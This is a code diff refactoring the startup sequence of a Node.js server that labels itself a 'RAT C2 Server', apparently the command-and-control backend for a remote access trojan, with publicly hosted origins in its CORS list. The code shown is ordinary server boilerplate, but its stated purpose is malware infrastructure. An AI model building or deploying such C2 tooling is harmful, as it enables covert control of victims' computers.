@@ -21,9 +21,6 @@ const server = http.createServer(app);
 const { Server: SocketIOServer } = require('socket.io');
 const { setupSocketIO } = require('./socket/handler');
 
-// Connect to MongoDB
-connectDB();
-
 // Trust proxy for Render (behind load balancer)
 app.set('trust proxy', 1);
 
@@ -97,43 +94,58 @@ app.use((err, req, res, next) => {
   });
 });
 
-// Seed admin on startup
-seedAdmin();
-
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, '0.0.0.0', () => {
-  console.log(`RAT C2 Server running on port ${PORT}`);
-  console.log(`Admin Panel URL: http://localhost:${PORT}/api`);
-  console.log(`Health Check: http://localhost:${PORT}/api/health`);
-});
 
-// Initialize Socket.IO
-const io = new SocketIOServer(server, {
-  cors: {
-    origin: function (origin, callback) {
-      const allowedOrigins = [
-        'http://localhost:3000',
-        'http://localhost:5000',
-        'https://rat-c2-delta.vercel.app',
-        'https://rat-c2-backend.onrender.com',
-      ];
-      if (!origin || allowedOrigins.indexOf(origin) !== -1) {
-        callback(null, true);
-      } else {
-        callback(new Error('Not allowed by CORS'));
-      }
-    },
-    methods: ['GET', 'POST'],
-    credentials: true,
-  },
-  pingTimeout: 60000,
-  pingInterval: 25000,
-});
+// Start server: connect DB first, then seed admin, then listen
+async function startServer() {
+  try {
+    // 1. Connect to MongoDB (await ensures DB is ready)
+    await connectDB();
+    console.log('MongoDB connected successfully');
 
-setupSocketIO(io);
+    // 2. Seed admin after DB is confirmed connected
+    await seedAdmin();
 
-// Make io accessible to controllers
-app.set('io', io);
+    // 3. Start listening
+    server.listen(PORT, '0.0.0.0', () => {
+      console.log(`RAT C2 Server running on port ${PORT}`);
+      console.log(`Admin Panel URL: http://localhost:${PORT}/api`);
+      console.log(`Health Check: http://localhost:${PORT}/api/health`);
+    });
 
-module.exports = { app, server, io };
+    // 4. Initialize Socket.IO
+    const io = new SocketIOServer(server, {
+      cors: {
+        origin: function (origin, callback) {
+          const allowedOrigins = [
+            'http://localhost:3000',
+            'http://localhost:5000',
+            'https://rat-c2-delta.vercel.app',
+            'https://rat-c2-backend.onrender.com',
+          ];
+          if (!origin || allowedOrigins.indexOf(origin) !== -1) {
+            callback(null, true);
+          } else {
+            callback(new Error('Not allowed by CORS'));
+          }
+        },
+        methods: ['GET', 'POST'],
+        credentials: true,
+      },
+      pingTimeout: 60000,
+      pingInterval: 25000,
+    });
 
+    setupSocketIO(io);
+
+    // Make io accessible to controllers
+    app.set('io', io);
+  } catch (error) {
+    console.error('Failed to start server:', error.message);
+    process.exit(1);
+  }
+}
+
+startServer();
+
+module.exports = { app, server };
